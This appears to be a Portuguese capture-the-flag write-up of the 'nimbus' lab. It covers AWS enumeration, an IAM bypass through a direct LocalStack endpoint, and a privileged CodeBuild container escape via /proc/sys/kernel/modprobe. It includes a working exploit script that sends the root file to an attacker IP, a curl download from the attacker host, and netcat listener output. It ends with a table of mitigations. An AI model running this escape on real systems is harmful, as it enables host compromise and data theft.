      {
  "Users": [],
  "IsTruncated": false,
  "ResponseMetadata": {
    "RequestId": "2fc8dfb8-817e-41af-b383-af7cd6e9fbae",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "267",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "f0d91c8f-f4f5-4fde-ad8f-82d2a1e2e865",
      "x-amz-request-id": "f0d91c8f-f4f5-4fde-ad8f-82d2a1e2e865",
      "x-amzn-requestid": "f0d91c8f-f4f5-4fde-ad8f-82d2a1e2e865"
    },
    "RetryAtt

  [+] kms.list_aliases
      {
  "Aliases": [],
  "Truncated": false,
  "ResponseMetadata": {
    "RequestId": "62ec61f8-876d-4b50-a5f8-d6db9e67cbb0",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "32",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "62ec61f8-876d-4b50-a5f8-d6db9e67cbb0",
      "x-amz-request-id": "62ec61f8-876d-4b50-a5f8-d6db9e67cbb0",
      "x-amzn-requestid": "62ec61f8-876d-4b50-a5f8-d6db9e67cb

  [+] kms.list_keys
      {
  "Keys": [],
  "Truncated": false,
  "ResponseMetadata": {
    "RequestId": "917d62c8-f615-4ea5-b74f-613fbaaf2c95",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "29",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "917d62c8-f615-4ea5-b74f-613fbaaf2c95",
      "x-amz-request-id": "917d62c8-f615-4ea5-b74f-613fbaaf2c95",
      "x-amzn-requestid": "917d62c8-f615-4ea5-b74f-613fbaaf2c95"

  [+] lambda.list_event_source_mappings
      {
  "ResponseMetadata": {
    "RequestId": "45579e5b-f48e-41b0-8253-eb7980b61b95",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/json;charset=UTF-8",
      "content-length": "26",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "45579e5b-f48e-41b0-8253-eb7980b61b95",
      "x-amz-request-id": "45579e5b-f48e-41b0-8253-eb7980b61b95",
      "x-amzn-requestid": "45579e5b-f48e-41b0-8253-eb7980b61b95"
    },
    "RetryAttempts": 0
  },
  "EventSo

  [+] lambda.list_functions
      {
  "ResponseMetadata": {
    "RequestId": "5b55f68a-636b-4d18-9ca4-b414f582829d",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/json;charset=UTF-8",
      "content-length": "16",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "5b55f68a-636b-4d18-9ca4-b414f582829d",
      "x-amz-request-id": "5b55f68a-636b-4d18-9ca4-b414f582829d",
      "x-amzn-requestid": "5b55f68a-636b-4d18-9ca4-b414f582829d"
    },
    "RetryAttempts": 0
  },
  "Functio

  [+] lambda.list_layer_versions
      {
  "ResponseMetadata": {
    "RequestId": "2f64a202-e820-4020-abf6-c72a338b0816",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/json;charset=UTF-8",
      "content-length": "20",
      "date": "Mon, 22 Jun 2026 02:23:38 GMT",
      "x-amz-id-2": "2f64a202-e820-4020-abf6-c72a338b0816",
      "x-amz-request-id": "2f64a202-e820-4020-abf6-c72a338b0816",
      "x-amzn-requestid": "2f64a202-e820-4020-abf6-c72a338b0816"
    },
    "RetryAttempts": 0
  },
  "LayerVe

  [+] lambda.list_layer_versions
      {
  "ResponseMetadata": {
    "RequestId": "3ed582f5-79b2-4e7a-8741-892d57f24c62",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/json;charset=UTF-8",
      "content-length": "20",
      "date": "Mon, 22 Jun 2026 02:23:38 GMT",
      "x-amz-id-2": "3ed582f5-79b2-4e7a-8741-892d57f24c62",
      "x-amz-request-id": "3ed582f5-79b2-4e7a-8741-892d57f24c62",
      "x-amzn-requestid": "3ed582f5-79b2-4e7a-8741-892d57f24c62"
    },
    "RetryAttempts": 0
  },
  "LayerVe

  [+] logs.describe_log_groups
      {
  "logGroups": [],
  "ResponseMetadata": {
    "RequestId": "1da85549-a719-4ee0-b335-5b4b19c40529",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "16",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "1da85549-a719-4ee0-b335-5b4b19c40529",
      "x-amz-request-id": "1da85549-a719-4ee0-b335-5b4b19c40529",
      "x-amzn-requestid": "1da85549-a719-4ee0-b335-5b4b19c40529"
    },
    "Retr

  [+] route53.list_hosted_zones
      {
  "ResponseMetadata": {
    "RequestId": "048442a0-8026-4d35-9e64-c115b996944a",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "205",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "048442a0-8026-4d35-9e64-c115b996944a",
      "x-amz-request-id": "048442a0-8026-4d35-9e64-c115b996944a",
      "x-amzn-requestid": "048442a0-8026-4d35-9e64-c115b996944a"
    },
    "RetryAttempts": 0
  },
  "HostedZones": [],
  "

  [+] s3.list_buckets
      {
  "ResponseMetadata": {
    "RequestId": "7c03b70a-13cb-4f18-ae44-9a06eb5b7ec8",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "324",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "7c03b70a-13cb-4f18-ae44-9a06eb5b7ec8",
      "x-amz-request-id": "7c03b70a-13cb-4f18-ae44-9a06eb5b7ec8",
      "x-amzn-requestid": "7c03b70a-13cb-4f18-ae44-9a06eb5b7ec8"
    },
    "RetryAttempts": 0
  },
  "Buckets": [
    {


  [+] secretsmanager.list_secrets
      {
  "SecretList": [],
  "ResponseMetadata": {
    "RequestId": "9e914ef0-d105-44d4-a192-d50c09b5e5cc",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "17",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "9e914ef0-d105-44d4-a192-d50c09b5e5cc",
      "x-amz-request-id": "9e914ef0-d105-44d4-a192-d50c09b5e5cc",
      "x-amzn-requestid": "9e914ef0-d105-44d4-a192-d50c09b5e5cc"
    },
    "Ret

  [+] sns.list_subscriptions
      {
  "Subscriptions": [],
  "ResponseMetadata": {
    "RequestId": "0e5e9690-0491-4f91-9ed7-e5d04cfed485",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "282",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "cb92e829-bb60-4d16-9a1a-709752754157",
      "x-amz-request-id": "cb92e829-bb60-4d16-9a1a-709752754157",
      "x-amzn-requestid": "cb92e829-bb60-4d16-9a1a-709752754157"
    },
    "RetryAttempts": 0
  }
}

  [+] sns.list_topics
      {
  "Topics": [],
  "ResponseMetadata": {
    "RequestId": "4268f026-51da-44a8-951a-3774a290f25d",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "240",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "267242ca-61cd-4e51-8a39-b4d1773799ff",
      "x-amz-request-id": "267242ca-61cd-4e51-8a39-b4d1773799ff",
      "x-amzn-requestid": "267242ca-61cd-4e51-8a39-b4d1773799ff"
    },
    "RetryAttempts": 0
  }
}

  [+] sqs.get_queue_attributes
      {
  "Attributes": {
    "DelaySeconds": "0",
    "MessageRetentionPeriod": "345600",
    "MaximumMessageSize": "262144",
    "VisibilityTimeout": "30",
    "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
    "CreatedTimestamp": "1782085759",
    "LastModifiedTimestamp": "1782085759",
    "ApproximateNumberOfMessages": "1",
    "ApproximateNumberOfMessagesNotVisible": "1"
  },
  "ResponseMetadata": {
    "RequestId": "7a0602c6-ccee-4a62-8813-24c8b7ab6a7d",
    "HTTPStatusCode": 200,

  [+] sqs.list_dead_letter_source_queues
      {
  "queueUrls": [],
  "ResponseMetadata": {
    "RequestId": "6069f773-8917-4673-aae2-bdafd6d95f62",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "16",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "6069f773-8917-4673-aae2-bdafd6d95f62",
      "x-amz-request-id": "6069f773-8917-4673-aae2-bdafd6d95f62",
      "x-amzn-requestid": "6069f773-8917-4673-aae2-bdafd6d95f62"
    },
    "Retr

  [+] sqs.list_queues
      {
  "QueueUrls": [
    "http://floci:4566/847219365028/nimbus-jobs"
  ],
  "ResponseMetadata": {
    "RequestId": "91f54a5f-f72c-4aee-8635-96c001c946d9",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "60",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "91f54a5f-f72c-4aee-8635-96c001c946d9",
      "x-amz-request-id": "91f54a5f-f72c-4aee-8635-96c001c946d9",
      "x-amzn-requestid": "91

  [+] sqs.send_message
      {
  "MD5OfMessageBody": "efebd898e52c44e3b3514775e5a7c2fa",
  "MessageId": "1aea3e32-9a44-4f62-aab0-497a23d8a270",
  "ResponseMetadata": {
    "RequestId": "68bb09c5-c6e0-40f1-b2b1-d7e540682187",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "106",
      "date": "Mon, 22 Jun 2026 02:23:38 GMT",
      "x-amz-id-2": "68bb09c5-c6e0-40f1-b2b1-d7e540682187",
      "x-amz-request-id": "68bb09c5-c6e0-40f1-b2b1-d

  [+] ssm.describe_instance_information
      {
  "InstanceInformationList": [],
  "ResponseMetadata": {
    "RequestId": "521d3e4f-f181-4340-931c-2ef611982bb6",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "30",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "521d3e4f-f181-4340-931c-2ef611982bb6",
      "x-amz-request-id": "521d3e4f-f181-4340-931c-2ef611982bb6",
      "x-amzn-requestid": "521d3e4f-f181-4340-931c-2ef611982bb6"


  [+] ssm.describe_parameters
      {
  "Parameters": [],
  "ResponseMetadata": {
    "RequestId": "65d14804-d605-4762-809b-83a42511ebd4",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "17",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "65d14804-d605-4762-809b-83a42511ebd4",
      "x-amz-request-id": "65d14804-d605-4762-809b-83a42511ebd4",
      "x-amzn-requestid": "65d14804-d605-4762-809b-83a42511ebd4"
    },
    "Ret

  [+] ssm.get_parameters_by_path
      {
  "Parameters": [],
  "ResponseMetadata": {
    "RequestId": "6e958ddd-0e9f-4491-81fa-914254ca93db",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "17",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "6e958ddd-0e9f-4491-81fa-914254ca93db",
      "x-amz-request-id": "6e958ddd-0e9f-4491-81fa-914254ca93db",
      "x-amzn-requestid": "6e958ddd-0e9f-4491-81fa-914254ca93db"
    },
    "Ret

  [+] ssm.list_command_invocations
      {
  "CommandInvocations": [],
  "ResponseMetadata": {
    "RequestId": "00e3b0c3-eb7f-43a9-9266-c2d5d54a9ef4",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "25",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "00e3b0c3-eb7f-43a9-9266-c2d5d54a9ef4",
      "x-amz-request-id": "00e3b0c3-eb7f-43a9-9266-c2d5d54a9ef4",
      "x-amzn-requestid": "00e3b0c3-eb7f-43a9-9266-c2d5d54a9ef4"
    },

  [+] stepfunctions.list_state_machines
      {
  "stateMachines": [],
  "ResponseMetadata": {
    "RequestId": "fdf975e2-b5d8-4992-a826-fa71792a3d11",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.0;charset=UTF-8",
      "content-length": "20",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "fdf975e2-b5d8-4992-a826-fa71792a3d11",
      "x-amz-request-id": "fdf975e2-b5d8-4992-a826-fa71792a3d11",
      "x-amzn-requestid": "fdf975e2-b5d8-4992-a826-fa71792a3d11"
    },
    "

  [+] sts.get_caller_identity
      {
  "UserId": "847219365028",
  "Account": "847219365028",
  "Arn": "arn:aws:iam::847219365028:root",
  "ResponseMetadata": {
    "RequestId": "d63a23e7-c569-47cb-87b1-a1b7c2ca7205",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "353",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "7b4bfe00-c376-4c5b-bf56-a75d1166ae39",
      "x-amz-request-id": "7b4bfe00-c376-4c5b-bf56-a75d1166ae39",
      "x-amzn-requestid"

====================================================================================================
  ⚠  NOT FOUND (6):
====================================================================================================
  [?] cloudfront.list_distributions -> An error occurred (NoSuchBucket) when calling the ListDistributions operation: The specified bucket does not exist.
  [?] logs.describe_log_streams -> An error occurred (ResourceNotFoundException) when calling the DescribeLogStreams operation: The specified log group doe
  [?] logs.describe_log_streams -> An error occurred (ResourceNotFoundException) when calling the DescribeLogStreams operation: The specified log group doe
  [?] s3.list_objects -> An error occurred (NoSuchBucket) when calling the ListObjects operation: The specified bucket does not exist.
  [?] s3.list_objects -> An error occurred (NoSuchBucket) when calling the ListObjects operation: The specified bucket does not exist.
  [?] s3.list_objects -> An error occurred (NoSuchBucket) when calling the ListObjects operation: The specified bucket does not exist.

====================================================================================================
  🔍 OTHER ERRORS (6):
====================================================================================================
  [!] cloudtrail.describe_trails -> An error occurred (UnknownOperationException) when calling the DescribeTrails operation: Unknown operation: com.amazonaw
  [!] cognito-identity.list_identity_pools -> An error occurred (UnknownOperationException) when calling the ListIdentityPools operation: Unknown operation: AWSCognit
  [!] ecr.list_images -> An error occurred (RepositoryNotFoundException) when calling the ListImages operation: The repository with name 'floci/f
  [!] ecr.list_images -> An error occurred (RepositoryNotFoundException) when calling the ListImages operation: The repository with name 'nimbus-
  [!] ecs.list_container_instances -> An error occurred (ClusterNotFoundException) when calling the ListContainerInstances operation: Cluster not found: nimbu
  [!] ecs.list_services -> An error occurred (ClusterNotFoundException) when calling the ListServices operation: Cluster not found: nimbus

====================================================================================================
  DONE
====================================================================================================
worker@4306f21d6fa5:/app$

```
Pelo `floci:4566` somos `root` na conta inteira. O LocalStack community trata toda requisição como admin. A "fronteira" de permissões que batíamos antes estava no proxy nginx (`aws.nimbus.htb`), que validava a role e devolvia `AccessDenied`. O `nimbus-worker-role` "restrito" era uma apenas pelo proxy. Batendo no LocalStack cru, pulamos a fronteira inteira.
Acesso  Como    Permissões efetivas
`nimbus-web-role` via proxy     IMDS/SSRF       escreve na fila (SQS)
`nimbus-worker-role` via proxy  `env` + `aws.nimbus.htb`        consome a fila (SQS)
via `floci:4566`        endpoint direto, de dentro      admin / root (sem IAM)
Agora que o `floci:4566` nos dá admin, o cliente do CodeBuild aponta para o LocalStack direto, isso faz o `create_project`/`start_build` passarem:
```python
import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ATTACKER_IP = "10.10.16.94"
LPORT = 1338

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - id
      - cat /proc/self/status | grep Cap
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('{ATTACKER_IP}', {LPORT}))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""

cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)

cb.create_project(
    name="nimbus-exploit",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
        "environmentVariables": [
            {"name": "BASH_FUNC_id%%",
             "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
             "type": "PLAINTEXT"}
        ],
    },
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)

resp = cb.start_build(projectName="nimbus-exploit")
print("started:", resp["build"]["id"])

```
https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation
https://www.vicarius.io/vsociety/posts/leaky-vessels-part-1-cve-2024-21626
```python
worker@7b501f11b98e:/app$ curl -o lpe.py http://10.10.16.94:8000/lpe.py
curl -o lpe.py http://10.10.16.94:8000/lpe.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1556  100  1556    0     0   1194      0  0:00:01  0:00:01 --:--:--  1195
worker@7b501f11b98e:/app$ ls
ls
lpe.py  requirements.txt  worker.py
worker@7b501f11b98e:/app$ python3 lpe.py
python3 lpe.py
started: nimbus-exploit:1
worker@7b501f11b98e:/app$

```
```python
kali@barroboy:~$ rlwrap -cAr nc -klnvp 1338
listening on [any] 9005 ...
connect to [10.10.16.94] from (UNKNOWN) [10.129.18.209] 49600
550fb613fe999a8961f7b17ca274414d

```
(a) `privilegedMode: True`. Um container privilegiado compartilha muito mais com o host: ele enxerga `/proc/sys/kernel/` do kernel real e pode escrever ali.
(b) `/proc/sys/kernel/modprobe`. Esse arquivo guarda o caminho do binário que o kernel executa, como root no host, sempre que precisa carregar um módulo. Normalmente vale `/sbin/modprobe`. Se conseguimos sobrescrevê-lo, apontamos o kernel para o nosso script.
(c) O detalhe do `upperdir`/overlayfs. O kernel vai executar o caminho na visão do host, não na visão do container. O sistema de arquivos do container é um overlayfs: o que dentro do container é `/tmp/payload.sh` existe no host num caminho tipo `/var/lib/docker/overlay2/<id>/diff/tmp/payload.sh`. Por isso o exploit lê o `upperdir` de `/proc/mounts` e escreve esse caminho traduzido em `modprobe`. Sem a tradução, o kernel não acharia o arquivo.
(d) O gatilho: `printf '\xff\xff\xff\xff' > /tmp/x` e executar. Esses 4 bytes são um "binário" com magic number inválido. Quando o kernel tenta executar um arquivo cujo formato ele não reconhece, ele tenta carregar um módulo que saiba lidar com aquele formato — e para isso chama o `modprobe`... que agora aponta para o nosso `payload.sh`.
Resultado: o kernel do host roda nosso script como root. O script lê `/root/root.txt` e manda de volta:
```python
kali@barroboy:~$ nc -klnvp 1338
connect to [10.10.16.94] from (UNKNOWN) [10.129.18.209]
550fb613fe999a8961f7b17ca274414d      ← root flag
```
Elo     Falha concreta  Causa raiz      O que cortaria a cadeia
SSRF    `/jobs` busca URL arbitrária    confiança em input do usuário   allowlist + bloqueio de faixas internas no DNS
Bypass IP       filtro por string textual       parser de URL ≠ resolver de rede        validar o IP resolvido, não o texto
Roubo de creds  IMDSv1 acessível via GET        metadata sem autenticação       IMDSv2 obrigatório (`HttpTokens: required`)
Enum IAM / SQS  role web lista/escreve em fila  privilégio excessivo    menor privilégio
RCE     worker executa job sem validar  desserialização insegura (`yaml.load`) + `python3 -c script`    sandbox + validação de schema do job
Bypass de IAM   falar com `floci:4566` direto   autorização só no proxy; LocalStack não enforce IAM     autorizar no backend (zero-trust); segmentar a rede
Acesso ao CodeBuild     mesma chave, endpoint direto = admin    sem fronteira de IAM atrás do proxy     impedir o container de alcançar `floci:4566`
PrivEsc CodeBuild privilegiado + `modprobe`     container de build privilegiado; `/proc/sys/kernel/modprobe` gravável  sem `privilegedMode`; isolar a role de CI